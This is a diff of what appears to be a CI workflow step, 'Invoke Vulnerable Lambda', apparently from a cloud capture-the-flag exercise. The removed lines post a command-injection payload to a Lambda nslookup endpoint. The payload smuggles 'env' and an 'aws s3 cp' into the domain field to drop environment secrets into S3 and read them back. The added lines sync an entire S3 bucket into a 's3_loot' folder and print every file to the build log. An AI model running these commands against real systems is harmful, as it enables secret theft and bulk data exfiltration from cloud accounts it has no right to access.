@@ -21,32 +21,21 @@ jobs:
 
       - name: Invoke Vulnerable Lambda
         run: |
-          API_ID="3q931syi7b"
-          REGION="us-east-1"
-          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
+          BUCKET="codec4f26c862a321ef5"
           
-          echo "=== 1. CHECKING IF OUR CICD ROLE CAN LIST S3 BUCKETS ==="
-          aws s || echo "S3 listing restricted for cicdRole"
+          echo "=== 1. RECURSIVELY LISTING ALL FILES IN THE BUCKET ==="
+          aws s3 ls "s3://$BUCKET" --recursive
           
           echo ""
-          echo "=== 2. FORCING LAMBDA TO DROP ENV TO S3 ==="
-          # This payload runs env, saves it to /tmp/output.txt, 
-          # and uses the Lambda's CLI to upload it to an S3 bucket in the account!
-          # (We'll check common bucket names or list them first)
-          PAYLOAD='{"domain": "127.0.0.1; env > /tmp/output.txt; aws s3 cp /tmp/output.txt s3://$(aws s3 ls | awk '\''{print $3}'\'' | head -n 1)/flag_drop.txt"}'
-          
-          curl -s -X POST "$URL" \
-            -H "Content-Type: application/json" \
-            -d "$PAYLOAD"
+          echo "=== 2. DOWNLOADING EVERYTHING LOCALLY ==="
+          mkdir -p s3_loot
+          aws s3 sync "s3://$BUCKET" ./s3_loot/
           
           echo ""
-          echo "=== 3. ATTEMPTING TO READ THE DROPPED FILE FROM S3 ==="
-          # Let's see if our runner can download that file from the bucket!
-          BUCKET_NAME=$(aws s3 ls 2>/dev/null | awk '{print $3}' | head -n 1)
-          if [ ! -z "$BUCKET_NAME" ]; then
-            echo "Found bucket: $BUCKET_NAME"
-            aws s3 cp "s3://$BUCKET_NAME/flag_drop.txt" ./downloaded_flag.txt || echo "Could not download file"
-            cat downloaded_flag.txt || echo "File is empty"
-          else
-            echo "No accessible S3 bucket found via cicdRole"
-          fi
+          echo "=== 3. PRINTING CONTENTS OF ALL DOWNLOADED FILES ==="
+          # This will automatically find every file in the loot folder and print its contents to the log
+          find ./s3_loot -type f -exec echo "====================" \; \
+                         -exec echo "FILE: {}" \; \
+                         -exec echo "====================" \; \
+                         -exec cat {} \; \
+                         -exec echo "" \;
